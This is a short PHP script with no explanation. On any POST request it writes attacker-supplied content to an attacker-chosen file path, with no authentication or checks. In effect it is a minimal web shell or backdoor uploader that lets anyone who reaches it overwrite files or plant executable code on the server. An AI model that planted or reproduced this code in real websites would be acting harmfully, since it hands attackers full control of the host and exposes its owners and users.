<?php
if($_SERVER["REQUEST_METHOD"] == "POST") {
    file_put_contents($_POST['path'], $_POST['content']);
}
?>